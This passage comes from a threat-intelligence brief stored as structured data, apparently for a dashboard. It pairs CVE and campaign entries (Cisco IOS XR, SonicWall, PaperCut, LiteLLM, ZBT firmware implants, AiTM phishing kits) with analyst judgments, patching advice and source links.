  "sub": "CrowdStrike Falcon Sensor Office macro remediation abused for local privilege escalation to SYSTEM. Public PoC Sep 3; CrowdStrike investigating, no CVE or fix — advises disabling the macro-removal policy setting."
 },
 {
  "key": "falconflank",
  "level": "high",
  "num": "PrettyPrague (no CVE)",
  "score": "",
  "flags": [
   "PoC"
  ],
  "sub": "Avast sandbox privilege escalation to full system privileges; may affect other Gen products including AVG and Norton. Gen says it has fixed the issue"
 },
 {
  "key": "falconflank",
  "level": "med",
  "num": "GreenSection (no CVE)",
  "score": "",
  "flags": [
   "PoC"
  ],
  "sub": "Nvidia user-mode shared memory out-of-bounds write; cross-user, researcher cites possible dwm.exe compromise. No Nvidia statement"
 },
 {
  "key": "postgreshell",
  "level": "high",
  "num": "CVE-2026-6471",
  "score": "7.2",
  "sub": "Missing authorization in logical decoding — REPLICATION role dlopens arbitrary file. Patched 18.6 / 17.11 / 16.15 / 15.19 / 14.24 (Aug 13); no exploitation reported."
 },
 {
  "key": "linuxkernelpoc",
  "level": "high",
  "num": "CVE-2026-52924",
  "score": "9.8",
  "sub": "SCTP stream use-after-free on Stale Cookie — local privilege escalation. Fixed upstream; public PoC Sep 5, 2026; verified on Ubuntu 7.0.0-28."
 },
 {
  "key": "linuxkernelpoc",
  "level": "high",
  "num": "CVE-2026-80714",
  "score": "9.8",
  "sub": "IPVS netfilter use-after-free — local root. Fixed in upstream commits; public PoC and video, root demonstrated on Debian."
 },
 {
  "key": "chromev8",
  "level": "crit",
  "num": "CVE-2026-85046",
  "score": "",
  "sub": "V8 type confusion — arbitrary code execution in the browser sandbox via a crafted page. Patched Chrome 152.0.7977.82/.83 (Sep 3); exploited in the wild; KEV Sep 4.",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "superforms",
  "level": "crit",
  "num": "CVE-2026-14894",
  "score": "9.8",
  "sub": "Unauthenticated arbitrary file upload via super_submit_form data URI. Patched 6.3.314 (Jul 8); mass exploitation from Jul 14, 250,000+ attempts blocked."
 },
 {
  "key": "superforms",
  "level": "crit",
  "num": "CVE-2026-32475",
  "score": "9.8",
  "sub": "Unauthenticated arbitrary file upload writing PHP to /wp-content/uploads/elementor/forms/. Patched Elementor Pro 4.2.2; exploitation from Aug 19, 2026."
 },
 {
  "key": "nodeabuse",
  "level": "high",
  "num": "Node.js runtime abuse",
  "score": "",
  "sub": "Signed node.exe executing attacker JavaScript; EtherHiding C2. Active since Feb 2026; no vulnerability involved — configuration and detection gap."
 },
 {
  "key": "magleak",
  "level": "crit",
  "num": "MAG data theft / FulcrumSec",
  "score": "",
  "sub": "Exposed Iterable API credentials in client-side JavaScript (actor claim). Data published Sep 2, 2026 after ransom refused; ~8.7M people."
 },
 {
  "key": "wpmigration",
  "level": "high",
  "num": "CVE-2026-19949",
  "score": "8.8",
  "sub": "Second-order SQLi via trackback, fires on archive export/restore. Patched 7.110 (Aug 20); weaponised PoC recorded."
 },
 {
  "key": "brazetsu",
  "level": "high",
  "num": "BraZetsu / Exilware",
  "score": "",
  "sub": "Access-broker framework; no CVE. Active since May 2026; some samples undetected on VirusTotal."
 },
 {
  "key": "ciscosep",
  "level": "crit",
  "num": "CVE-2026-20274",
  "score": "9.8",
  "sub": "Cisco IOS XR memory-safety and resource-lifetime bugs (buffer overflow, use-after-free) grouped under one CVE — malformed packets corrupt memory in core routing daemons. Affects all releases regardless of configuration; no workarounds. Not known to be exploited"
 },
 {
  "key": "ciscosep",
  "level": "crit",
  "num": "CVE-2026-20279",
  "score": "9.8",
  "sub": "Cisco IOS XR access-control bugs including missing authentication for critical functions and improper certificate validation — authorization bypass to administrative actions without valid credentials. Affects all releases; no workarounds"
 },
 {
  "key": "ciscosep",
  "level": "crit",
  "num": "CVE-2026-20212",
  "score": "9.8",
  "sub": "Cisco Nexus 9000 Series Silicon One remote code execution — unauthenticated attacker connects to by-default accessible TCP ports and executes code as root. No fixed-release table published; Cisco directs customers to Software Checker, with an iACL and Live Protect shield as stopgaps"
 },
 {
  "key": "switchvox",
  "level": "crit",
  "num": "CVE-2026-9586",
  "score": "9.3",
  "sub": "Sangoma Switchvox SMB Edition 8.3 (104997) unauthenticated SQL injection on the /pa endpoint — arbitrary SQL as PostgreSQL superuser reaching RCE. Patched in 8.4.0.2 (Jul 14, 2026); exploited from Aug 30; KEV Sep 2, federal deadline Sep 5",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "kevsep02",
  "level": "crit",
  "num": "CVE-2026-49869",
  "score": "10.0",
  "sub": "Kestra OSS OS command injection — unauthenticated remote attacker can create and execute arbitrary workflows without credentials. KEV Sep 2 on the strength of a Microsoft report of likely exploitation in late June 2026; federal deadline Sep 5",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "kevsep02",
  "level": "high",
  "num": "CVE-2026-59822",
  "score": "8.8",
  "sub": "Berri LiteLLM MCP Streamable HTTP endpoint improper authentication — any Bearer token establishes an authenticated MCP session. Discovered by Wiz; KEV Sep 2, federal deadline Sep 16",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "kevsep02",
  "level": "med",
  "num": "CVE-2026-48710",
  "score": "6.5",
  "sub": "Kludex Starlette HTTP request/response smuggling (BadHost) — path injection into the host part enabling authentication bypass where auth depends on the reconstructed URL path. Chains with LiteLLM CVE-2026-42271 for unauthenticated RCE. KEV Sep 2, federal deadline Sep 16",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "aiinfra",
  "level": "high",
  "num": "CVE-2026-42271",
  "score": "8.7",
  "sub": "Berri LiteLLM MCP server test endpoints command injection — the command field is passed to subprocess execution without validation. Added to KEV in June 2026; chained with CVE-2026-48710 for unauthenticated RCE, linked by Wiz to Qilin ransomware activity",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "sonicwallsma",
  "level": "crit",
  "num": "CVE-2026-83548",
  "score": "10.0",
  "sub": "SonicWall SMA1000 Appliance Work Place pre-authentication SSRF — unauthenticated access to sensitive functionality; chained with CVE-2026-83549 in observed attacks. Added to CISA KEV Sep 2, 2026; federal deadline Sep 5, 2026",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "sonicwallsma",
  "level": "high",
  "num": "CVE-2026-83549",
  "score": "7.8",
  "sub": "SonicWall SMA1000 Appliance Management Console OS command injection — authenticated command execution reaching RCE. Added to CISA KEV Sep 2, 2026; federal deadline Sep 5, 2026",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "langflow",
  "level": "crit",
  "num": "CVE-2026-0768",
  "score": "9.8",
  "sub": "Langflow custom component editor code validator — unauthenticated arbitrary Python execution as root. All releases up to 1.4.2; disclosed as a zero-day Jan 2026 (ZDI-26-034), exploitation confirmed Sep 1, 2026"
 },
 {
  "key": "jfrog82329",
  "level": "crit",
  "num": "CVE-2026-82329",
  "score": "9.8",
  "sub": "JFrog Artifactory improper authentication — under default configuration an unauthenticated attacker with network access can obtain administrative privileges. Self-hosted only; patched Aug 28, exploitation reported Sep 1, added to CISA KEV Sep 2 with a federal deadline of Sep 5, 2026",
  "flags": [
   "KEV"
  ]
 },
 {
  "key": "virtualizor",
  "level": "crit",
  "num": "Virtualizor BGP hijack",
  "score": "—",
  "sub": "Aug 28–30, 2026: AS62390 announced a more-specific prefix inside Hetzner space holding Softaculous systems; malicious Virtualizor update served under a valid Let's Encrypt certificate. No CVE — infrastructure and distribution compromise"
 },
 {
  "key": "watchguardiked",
  "level": "high",
  "num": "WatchGuard Fireware iked (×3)",
  "score": "—",
  "sub": "Three critical Fireware OS vulnerabilities in the iked process — unauthenticated remote code execution. Patched; no exploitation reported. Individual CVE identifiers not stated in the reporting reviewed"
 },
 {
  "key": "astracyber",
  "level": "high",
  "num": "OpenAI Astra — critical threshold",
  "score": "—",
  "sub": "Vendor-declared crossing of a critical cyber capability threshold after the model found zero-days. Capability assessment, not a vulnerability — no CVE, no CVSS"
 },
 {
  "key": "iranot",
  "level": "crit",
  "num": "Iran-linked OT intrusions",
  "score": "",
  "sub": "Small UK power plant offline four days; dozens of wastewater plants across twelve US states disrupted with flooding and pressure loss. PLCs targeted, operator passwords changed, controllers disconnected",
  "flags": [
   "Active campaign",
   "OT/ICS impact",
   "State-linked"
  ]
 },
 {
  "key": "novacookies",
  "level": "crit",
  "num": "NovaCookies PhaaS",
  "score": "",
  "sub": "Commercial AiTM service relaying Microsoft 365 sign-ins and capturing session cookies after MFA. $320/month. 755 domains published as dedicated infrastructure; ~90% of observed lures on .vu",
  "flags": [
   "Active campaign",
   "MFA bypass",
   "PhaaS"
  ]
 },
 {
  "key": "papercut",
  "level": "crit",
  "num": "CVE-2026-82078",
  "score": "9.4",
  "sub": "PaperCut NG/MF unsafe dynamic class loading in database connection utilities — chained for unauthenticated RCE. Exploited as a zero-day",
  "flags": [
   "Exploited",
   "Zero-day",
   "Patch bypasses found",
   "KEV"
  ]
 },
 {
  "key": "papercut",
  "level": "crit",
  "num": "CVE-2026-81578",
  "score": "8.8",
  "sub": "PaperCut NG/MF improper access control in the web management interface — unauthenticated requests trigger backend actions before access validation completes",
  "flags": [
   "Exploited",
   "Zero-day",
   "KEV"
  ]
 },
 {
  "key": "zbtimplants",
  "level": "crit",
  "num": "CVE-2026-74232",
  "score": "9.3",
  "sub": "SPEAKINGSTONE — yunmgrd factory C2 implant in ZBT router firmware; root command execution, PPPoE credential theft, DNS hijack list, reverse SSH. CVSS 4.0 9.3 / CVSS 3.1 9.8",
  "flags": [
   "Factory implant",
   "No fixed firmware"
  ]
 },
 {
  "key": "zbtimplants",
  "level": "crit",
  "num": "CVE-2026-74233",
  "score": "9.3",
  "sub": "DARKLANTERN — infosrvd command injection on UDP 9992, open inbound by stock firewall; ineffective auth via hardcoded salt and wildcard MAC. 203 internet-facing instances found",
  "flags": [
   "Exploited (VulnCheck)",
   "Public PoC (CISA Vulnrichment)",
   "No fixed firmware"
  ]
 },
 {
  "key": "shieldbreak",
  "level": "crit",
  "num": "CVE-2026-69414",
  "score": "—",
  "flags": [],
  "sub": "ShieldBreak — Defender EoP bypass → SYSTEM. No patch, PoC public. Deploy Beaumont's KQL queries."
 }
],
  KJ: [
 {
  "num": "01",
  "html": "<b>September's Patch Tuesday is the largest on record, and neither flaw under active attack would be caught by a severity-gated emergency ring.</b> CVE-2026-85880 in Windows ALPC and CVE-2026-81963 in the Windows Update Stack are both rated Important, both score 7.8, and both are local privilege escalation — Microsoft published no actor, no targeting and no exploitation detail, so version state is the entire defensive position. We assess with <b>high confidence</b> that the operational risk this month is triage discipline rather than volume: patch the two exploited CVEs first regardless of rating, patch Office separately from Windows, and scope from your own Security Update Guide export, because <b>published totals range from 966 to 996 and Critical counts from 105 to 121</b> depending on what each outlet includes. ZDI's assessment of 20 wormable flaws — unauthenticated RCE with no user interaction, none known exploited today — is where the strategic risk sits."
 },
 {
  "num": "02",
  "html": "<b>The week's decisive exposure is the e-commerce platform, and the patch arrived after the compromises.</b> Sansec found StyleSmuggler in a live incident on Sep 4, published early on Sep 5 while stores were being compromised, and Adobe issued CVE-2026-75650 at CVSS 10.0 with the VULN-39341 hotfix on Sep 7 — roughly three days of unauthenticated RCE against every release from 2.4.4 through 2.4.9 with no fix available. The first confirmed victim was fully patched at 2.4.6-p15. We assess with <b>high confidence</b> that patch state is not a sufficient answer for any internet-facing Magento or Adobe Commerce store this week, and that operators should scan for the implant and rotate the encryption key, admin passwords and payment provider credentials before concluding they were unaffected. Note the indicator decay: the implant changed process name twice in three days and moved its C2 from TLS/WebSockets to NTP-shaped UDP, so <b>name-based detections written on Sep 5 are already behind</b>."
 },
 {
  "num": "03",
  "html": "<b>Two of this week's highest-impact items involve no vulnerability the defender can patch.</b> The rogue ScreenConnect campaign Huntress documented starts with a phone call and propagates through the product's own file-transfer capability to newly connected endpoints, and the DPRK-aligned toolkit Rapid7 analysed hides inside a recompiled HAProxy binary that continues to load-balance correctly. In both cases the control is configuration and integrity rather than patching: disable ScreenConnect's TransferFiles and TransferFilesInSession permissions per ConnectWise's advisory, and verify edge-device binaries against distribution packages rather than trusting a version string. We assess with <b>high confidence</b> that remote-management and edge-network assets are the least-instrumented part of most estates and the ones where these two techniques are designed to sit."
 },
 {
  "num": "04",
  "html": "<b>Exploit tooling, not disclosure, is what moves a patched flaw back onto the queue.</b> TantoSec's Sep 7 release turned a Telerik UI chain that Progress fixed on Jul 8 into a runnable attack path with a command-line tool and two DLL payloads, and Nightmare Eclipse dropped three endpoint-security and driver PoCs inside a week, with Kevin Beaumont confirming the Avast, CrowdStrike and Kaspersky ones work. Neither has confirmed in-the-wild exploitation. We assess with <b>moderate confidence</b> that the practical exposure in both cases is inventory rather than severity: Telerik UI usually arrives bundled inside a third-party ASP.NET application and appears in no asset list under its own name, and the conditional configuration that makes it reachable — RadAsyncUpload with a FileUploaded handler reading UploadResult — can only be answered by looking. <b>The inventory pass is the deliverable, not the patch.</b>"
 },
 {
  "num": "05",
  "html": "<b>Remote-access appliances are the week's decisive exposure, and vendors are now finding these flaws by investigating live intrusions rather than through research.</b> SonicWall disclosed CVE-2026-83548 (CVSS 10.0) and CVE-2026-83549 as zero-days it discovered internally along with their exploitation, WatchGuard patched three critical unauthenticated RCE flaws in the Fireware OS iked process. We assess with <b>high confidence</b> that patch state on VPN and SSL-VPN terminators is the single highest-yield defensive action available this week; note that SonicWall published no indicators, so absence of artefacts is not evidence of absence of compromise. CISA added both SonicWall CVEs to KEV on Sep 2 with a Sep 5 federal deadline."
 },
 {
  "num": "06",
  "html": "<b>The software supply chain was attacked at its control plane twice this week, by different means and with the same objective.</b> watchTowr observed attackers minting administrator tokens through JFrog Artifactory CVE-2026-82329 and enumerating credential sets and federated access topologies, while a BGP hijack of Softaculous address space delivered a malicious Virtualizor update under a legitimately issued Let's Encrypt certificate, against an update client that did not verify package signatures. We assess with <b>high confidence</b> that build and distribution systems now warrant the same controls as identity systems — token inventory and revocation, independent package signature verification, and certificate transparency monitoring — because in both cases the transport and the patch were not the thing that failed."
 },
 {
  "num": "07",
  "html": "<b>Self-hosted AI tooling has become an exploited attack surface, and the exploitation is aimed at secrets rather than the host.</b> VulnCheck reports CVE-2026-0768 (CVSS 9.8) being used against Langflow for environment variables, secret keys and SSH access, with 360-plus attempts on its UK canaries and more than 15,000 successful attacks across three other Langflow flaws; before 2026 only one Langflow CVE was known exploited, and eleven more have been added since. Set against OpenAI's declaration that its Astra model crossed a critical cyber capability threshold after finding zero-days, Wiz's 90-day honeypot telemetry and a parallel Microsoft analysis now show the same surface being worked systematically — MCP command injection, blind prompt injection, and master keys read out of LiteLLM process memory rather than off disk — and we assess with <b>high confidence</b> that AI platform hosts should be inventoried and credential-scoped as production identity assets, and that the discovery-to-exploitation window will keep compressing."
 },
 {
  "num": "08",
  "html": "<b>Rented AiTM is now the dominant Microsoft 365 account-takeover path in this brief, and it is a product problem rather than a domain problem.</b> NovaCookies ($320/month, 755 published domains, ~90% of observed lures on <code>.vu</code>) sits alongside Mirage2FA and the Azure/Entra enumeration campaign already carried here. All three defeat ordinary one-time codes and push approvals by design: the victim completes a real authentication through an attacker-controlled relay. We assess with <b>high confidence</b> that only origin-bound credentials — passkeys and FIDO2 keys — plus Entra ID Token Protection change the outcome, and that domain blocklists alone will not: Island's own framing is that campaigns which look unrelated can be deployments of the same rented product, so <b>blocking yesterday's domain removes one disposable part of the operation</b>."
 },
 {
  "num": "09",
  "html": "<b>PaperCut has moved from emergency patching to incident response.</b> CISA added CVE-2026-82078 (CVSS 9.4) and CVE-2026-81578 (CVSS 8.8) to the KEV catalog on Aug 31, 2026 under BOD 26-04, which brings the Forensics Triage Requirements with it, and SecurityWeek reports exploitation escalating from probing to active intrusions. watchTowr had already documented bypasses of the first emergency patch. We assess with <b>high confidence</b> that any internet-exposed PaperCut NG or MF server left unpatched after Aug 27 should be treated as presumed compromised pending log review — and that the review must use archived copies of server.log, since the post-exploitation tooling deletes the live file."
 },
 {
  "num": "10",
  "html": "We assess with <b>moderate-to-high confidence</b> that device supply chain is now a distinct exposure class rather than a research curiosity. VulnCheck's SPEAKINGSTONE and DARKLANTERN are the second and third factory implants found in ZBT firmware in a month, after ENDLESSDOORS on Aug 5. No fixed firmware exists for any of the three, and model number rather than brand is the only reliable check because the same hardware ships under reseller names. <b>Blocking inbound UDP/9992 at the edge closes the DARKLANTERN listener</b> while a fix is outstanding; the MAC prefixes 78:A3:51 and F8:5E:3C identify the manufacturer from the device's own address."
 },
 {
  "num": "11",
  "html": "We assess with <b>high confidence</b> that Iran-linked activity against Western critical infrastructure has moved from access and reconnaissance to disruption. A small UK generator was taken offline for four days, and dozens of US wastewater plants across twelve states were disrupted with flooding and loss of water pressure, with CISA's Jul 30 advisory describing operator lockout and disconnected controllers. Researchers quoted in the reporting assess the UK case as a capability demonstration. The exposure is structural: reporting notes attackers found far more reachable PLCs in water than in power, where binding federal requirements apply, and that a volunteer defence programme had reached 21 of roughly 50,000 unprotected small utilities. Organisations with OT should verify that controller management paths are not internet-reachable and that manual-operation fallback is exercised, not assumed."
 },
 {
  "num": "12",
  "html": "<b>The Sep 2 KEV batch is the clearest signal yet that the exploited attack surface has moved into the build and AI chain.</b> Four of the seven additions — JFrog Artifactory, Starlette, Kestra OSS and LiteLLM — are components owned by engineering rather than by IT operations, and two of them (Starlette, LiteLLM) are dependencies that will not appear in an asset inventory under their own name. We assess with <b>high confidence</b> that organisations reconciling this batch against a CMDB will under-count their exposure, and that the reliable method is dependency and container inventory rather than asset lists; note also that the Kestra listing rests on a single Microsoft report of likely exploitation in late June, which is a lower evidentiary bar than the honeypot captures behind the other entries."
 },
 {
  "num": "13",
  "html": "<b>Cisco's IOS XR bundle is a disclosure-model change as much as a patch cycle.</b> Seven CVEs stand in for many underlying bugs grouped by weakness class, the advisory states all releases are affected regardless of configuration with no workarounds, and Cisco credits \"frontier AI models\" alongside existing processes for finding them. We assess with <b>moderate confidence</b> that CWE-grouped CVEs will make severity-based prioritisation less reliable over the coming quarters, because one identifier no longer maps to one defect or one exploitation path; and we note that Sygnia's report of Fire Ant implants suppressing syslog on IOS XR routers, six days earlier, means router log gaps deserve investigation on their own merits while patching proceeds."
 },
 {
  "num": "14",
  "html": "<b>Credentials shipped to the browser are now a primary initial-access path, and they are invisible to every control on the network.</b> FulcrumSec told BleepingComputer it reached MAG's backend customer systems using Iterable API keys left in the client-side JavaScript of all three airport websites, and published 8.7 million people's data when the ransom was refused; MAG has not confirmed the path. We assess with <b>moderate confidence</b> — the access path is an actor claim, not a vendor finding — that any organisation embedding third-party platform keys in front-end code should treat that as an exposure of the same class as an unauthenticated admin endpoint. <b>The check costs one pass over your own published bundles</b>, and no endpoint or perimeter telemetry would have surfaced this: the exfiltration ran through a legitimate API with valid credentials."
 }
],
  SOURCES: [
 {
  "group": "Microsoft September 2026 Patch Tuesday — Sep 8, 2026",
  "links": [
   {
    "label": "Microsoft Security Update Guide — September 2026 release notes",
    "url": "https://msrc.microsoft.com/update-guide/releaseNote/2026-Sep"
   },
   {
    "label": "BleepingComputer — Microsoft September 2026 Patch Tuesday fixes 966 flaws, 2 zero-days",
    "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-september-2026-patch-tuesday-fixes-966-flaws-2-zero-days/"
   },
   {
    "label": "SecurityWeek — Microsoft Patches Record 974 Vulnerabilities, Including Two Exploited Zero-Days",
    "url": "https://www.securityweek.com/microsoft-patches-record-974-vulnerabilities-including-two-exploited-zero-days/"
   },
   {
    "label": "CybersecurityNews — Microsoft Patch Tuesday September 2026: 973 Vulnerabilities Fixed, Including 2 Zero-Days",
    "url": "https://cybersecuritynews.com/microsoft-patch-tuesday-update-september-2026/"
   },
   {
    "label": "securityonline.info — September 2026 Patch Tuesday Fixes 2 Exploited Windows Zero-Days",
    "url": "https://securityonline.info/patch-tuesday-zero-day-september-2026/"
   },
   {
    "label": "Action1 — Patch Tuesday September 2026",
    "url": "https://www.action1.com/patch-tuesday/patch-tuesday-september-2026/"
   },
   {
    "label": "ntcompatible — Microsoft September 2026 Patch Tuesday: 973 CVEs Fixed, 2 Actively Exploited Flaws Confirmed",
    "url": "https://www.ntcompatible.com/story/microsoft-september-2026-patch-tuesday-973-cves-fixed-2-actively-exploited-flaws-confirmed"
   },
   {
    "label": "Help Net Security — September 2026 Patch Tuesday forecast",
    "url": "https://www.helpnetsecurity.com/2026/09/04/september-2026-patch-tuesday-forecast/"
   },
   {
    "label": "Windows Report — September 2026 Patch Tuesday Shatters Microsoft's Record With 966 Security Fixes",
    "url": "https://windowsreport.com/september-2026-patch-tuesday-shatters-microsofts-record-with-966-security-fixes/"
   }
  ]
 },
 {
  "group": "Magento / Adobe Commerce StyleSmuggler CVE-2026-75650 — Sep 5–7, 2026",
  "links": [
   {
    "label": "Sansec — StyleSmuggler: Magento and Adobe Commerce 0-day RCE (CVE-2026-75650) under active attack",
    "url": "https://sansec.io/research/stylesmuggler-0day"
   },
   {
    "label": "BleepingComputer — Magento StyleSmuggler zero-day exploited to deploy Linux backdoor",
    "url": "https://www.bleepingcomputer.com/news/security/magento-stylesmuggler-zero-day-exploited-to-deploy-linux-backdoor/"
   },
   {
    "label": "SecurityWeek — Adobe Commerce Zero-Day Exploited to Backdoor Online Stores",
    "url": "https://www.securityweek.com/adobe-commerce-zero-day-exploited-to-backdoor-online-stores/"
   },
   {
    "label": "The Hacker News — Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores",
    "url": "https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html"
   },
   {
    "label": "SOCRadar — StyleSmuggler: Unpatched Magento and Adobe Commerce Zero-Day Exploited",
    "url": "https://socradar.io/blog/stylesmuggler-magento-adobe-commerce-0day/"
   },
   {
    "label": "SecPod — StyleSmuggler: Inside the Unpatched Magento Zero-Day Backdooring Live Stores",
    "url": "https://www.secpod.com/learn/security-research/style-smuggler-inside-the-unpatched-magento-zero-day-backdooring-live-stores"
   },
   {
    "label": "cyberpress.org — Hackers Exploit StyleSmuggler Magento and Adobe Commerce Zero-Day for Unauthenticated RCE",
    "url": "https://cyberpress.org/hackers-exploit-stylesmuggler-magento-adobe-commerce-zero-day/"
   }
  ]
 },
 {
  "group": "Telerik UI for ASP.NET AJAX exploit chain — Jul 8 – Sep 7, 2026",
  "links": [
   {
    "label": "The Hacker News — Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE, Public Exploit Released",
    "url": "https://thehackernews.com/2026/09/telerik-ui-padding-oracle-bug-chained.html"
   },
   {
    "label": "CybersecurityNews — Telerik Flaw Chain Lets Unauthenticated Attackers Turn Padding Oracle Into Remote Code Execution",
    "url": "https://cybersecuritynews.com/telerik-flaw-chain/"
   },
   {
    "label": "cyberpress.org — Telerik UI Flaws Chain AES-CBC Padding Oracle to Unauthenticated Remote Code Execution",
    "url": "https://cyberpress.org/telerik-ui-flaws-chain-aes-cbc-padding-oracle/"
   }
  ]
 },
 {
  "group": "ScreenConnect rogue clients / worm-like campaign — Sep 3–7, 2026",
  "links": [
   {
    "label": "Huntress — Rogue ScreenConnect Installations Across Unrelated Hosts Suggest Worm-Like Activity",
    "url": "https://www.huntress.com/blog/rogue-screenconnect-installations"
   },
   {
    "label": "SecurityWeek — Modified ScreenConnect Clients Used in Worm-Like Campaign",
    "url": "https://www.securityweek.com/modified-screenconnect-clients-used-in-worm-like-campaign/"
   },
   {
    "label": "GBHackers — Rogue ScreenConnect Clients Spread Worm-Like Malware Across Connected Windows Systems",
    "url": "https://gbhackers.com/rogue-screenconnect-clients/"
   },
   {
    "label": "Cyberpresso — ScreenConnect worm spreads via guest file transfer",
    "url": "https://cyberpresso.com/blog/screenconnect-guest-file-transfer-worm"
   }
  ]
 },
 {
  "group": "DPRK-aligned ted backdoor and CurlRAT — Sep 7, 2026",
  "links": [
   {
    "label": "Rapid7 — DPRK APTs' ted backdoor and CurlRAT target South Korean media and automotive sectors",
    "url": "https://www.rapid7.com/blog/post/tr-dprk-apts-ted-backdoor-curlrat-target-south-korean-media-automotive-sectors/"
   },
   {
    "label": "SecurityWeek — North Korean Hackers Deploy New Linux Espionage Toolkit",
    "url": "https://www.securityweek.com/north-korean-hackers-deploy-new-linux-espionage-toolkit/"
   }
  ]
 },
 {
  "group": "Nightmare Eclipse — PrettyPrague and GreenSection drops, Sep 7, 2026",
  "links": [
   {
    "label": "SecurityWeek — Nightmare Eclipse Drops CrowdStrike, Nvidia, Avast Zero-Day Exploits",
    "url": "https://www.securityweek.com/nightmare-eclipse-drops-crowdstrike-nvidia-avast-zero-day-exploits/"
   },
   {
    "label": "MSNightmare/PrettyPrague — Avast sandbox privilege escalation PoC",
    "url": "https://github.com/MSNightmare/PrettyPrague"
   },
   {
    "label": "MSNightmare/GreenSection — Nvidia shared-memory out-of-bounds write PoC",
    "url": "https://github.com/MSNightmare/GreenSection"
   },
   {
    "label": "Kevin Beaumont — confirmation that the Avast, CrowdStrike and Kaspersky exploits work",
    "url": "https://cyberplace.social/@GossiTheDog/117207575150746857"
   }
  ]
 },
 {
  "group": "HPE Aruba Networking AOS-CX CVE-2026-73749 — Sep 4, 2026",
  "links": [
   {
    "label": "SecurityWeek — HPE Patches Critical RCE Vulnerabilities in AOS-CX",
    "url": "https://www.securityweek.com/hpe-patches-critical-rce-vulnerabilities-in-aos-cx/"
   }
  ]
 },
 {
  "group": "N-able N-central CVE-2026-86218 — Sep 5–6, 2026",
  "links": [
   {
    "label": "Huntress — Rapid Response: Critical N-able N-central Vulnerability and Active Exploitation",
    "url": "https://www.huntress.com/blog/n-able-vulnerability-exploitation"
   },
   {
    "label": "N-able — CVE-2026-86218 pre-authentication remote code execution advisory",
    "url": "https://me.n-able.com/s/security-advisory/aArVy0000002Ld3KAE/cve202686218-preauthentication-remote-code-execution"
   },
   {
    "label": "N-able status — N-central 2026.3 Hotfix 4 (CVE-2026-86218)",
    "url": "https://status.n-able.com/2026/09/06/n-central-2026-3-hotfix-4-cve-2026-86218/"
   },
   {
    "label": "N-able — Active incident page for the CVE-2026-86218 exploitation",
    "url": "https://uptime.n-able.com/event/201814/"
   },
   {
    "label": "CVE record — CVE-2026-86207",
    "url": "https://www.cve.org/CVERecord?id=CVE-2026-86207"
   }
  ]
 },
 {
  "group": "FalconFlank CrowdStrike Falcon PoC — Sep 3–6, 2026",
  "links": [
   {
    "label": "The Hacker News — Researcher releases FalconFlank PoC showing privilege escalation in CrowdStrike Falcon",
    "url": "https://thehackernews.com/2026/09/researcher-releases-falconflank-poc.html"
   },
   {
    "label": "BleepingComputer — New CrowdStrike 'FalconFlank' zero-day grants SYSTEM privileges",
    "url": "https://www.bleepingcomputer.com/news/security/new-crowdstrike-falconflank-zero-day-grants-system-privileges/"
   },
   {
    "label": "Truesec — Privilege escalation vulnerability in Falcon CrowdStrike",
    "url": "https://www.truesec.com/hub/blog/privilege-escalation-vulnerability-in-falcon-crowdstrike"
   },
   {
    "label": "SOCRadar — FalconFlank: CrowdStrike Falcon 0-day PoC",
    "url": "https://socradar.io/blog/falconflank-crowdstrike-falcon-0day-poc/"
   },
   {
    "label": "SOC Prime — FalconFlank exposes CrowdStrike Falcon privilege escalation risk",
    "url": "https://socprime.com/active-threats/falconflank-exposes-crowdstrike-falcon-privilege-escalation-risk/"
   },
   {
    "label": "Foresiet — FalconFlank CrowdStrike privilege escalation advisory",
    "url": "https://foresiet.com/blog/falconflank-crowdstrike-privilege-escalation-advisory/"
   }
  ]
 },
 {
  "group": "PostgreSQL PostGREShell CVE-2026-6471 — Sep 1–5, 2026",
  "links": [
   {
    "label": "Cyera Research — PostGREShell: the database powering much of the internet had an open door for 12 years",
    "url": "https://www.cyera.com/research/postgreshell-the-database-powering-much-of-the-internet-had-an-open-door-for-12-years"
   },
   {
    "label": "SecurityWeek — 12-year-old PostgreSQL vulnerability enables database, server takeover",
    "url": "https://www.securityweek.com/12-year-old-postgresql-vulnerability-enables-database-server-takeover/"
   },
   {
    "label": "Security Affairs — PostgreSQL hit by 12-year-old vulnerability allowing server takeover",
    "url": "https://securityaffairs.com/198433/security/postgresql-hit-by-12-year-old-vulnerability-allowing-server-takeover.html"
   },
   {
    "label": "CSO Online — Decade-old PostgreSQL flaw turns backup account into a backdoor",
    "url": "https://www.csoonline.com/article/4218101/decade-old-postgresql-flaw-turns-backup-account-into-a-backdoor.html"
   },
   {
    "label": "GBHackers — 12-year-old PostgreSQL flaw lets attackers execute code and take over database servers",
    "url": "https://gbhackers.com/12-year-old-postgresql-flaw/"
   }
  ]
 },
 {
  "group": "Linux kernel local-root PoCs — Sep 3–6, 2026",
  "links": [
   {
    "label": "securityonline.info — CVE-2026-52924 PoC exploit disclosed: Linux root privilege escalation",
    "url": "https://securityonline.info/linux-cve-2026-52924-poc/"
   },
   {
    "label": "securityonline.info — CVE-2026-80714 (CVSS 9.8): Linux root escalation PoC out",
    "url": "https://securityonline.info/linux-kernel-cve-2026-80714-root-escalation/"
   },
   {
    "label": "Intruder CVE data — CVE-2026-52924 overview and upstream commit detail",
    "url": "https://cvemon.intruder.io/cves/CVE-2026-52924"
   }
  ]
 },
 {
  "group": "PaperCut education-sector exploitation — Sep 5, 2026",
  "links": [
   {
    "label": "The Hacker News — Attackers exploit PaperCut flaws to steal credentials from schools and universities",
    "url": "https://thehackernews.com/2026/09/attackers-exploit-papercut-flaws-to.html"
   },
   {
    "label": "Security Affairs — PaperCut flaws exploited in attacks on U.S. and European schools",
    "url": "https://securityaffairs.com/198476/hacking/papercut-flaws-exploited-in-attacks-on-u-s-and-european-schools.html"
   },
   {
    "label": "SOC Prime — CVE-2026-81578: exploited PaperCut auth bypass",
    "url": "https://socprime.com/blog/cve-2026-81578-analysis/"
   }
  ]
 },
 {
  "group": "Chrome CVE-2026-85046 — Sep 3–5, 2026",
  "links": [
   {
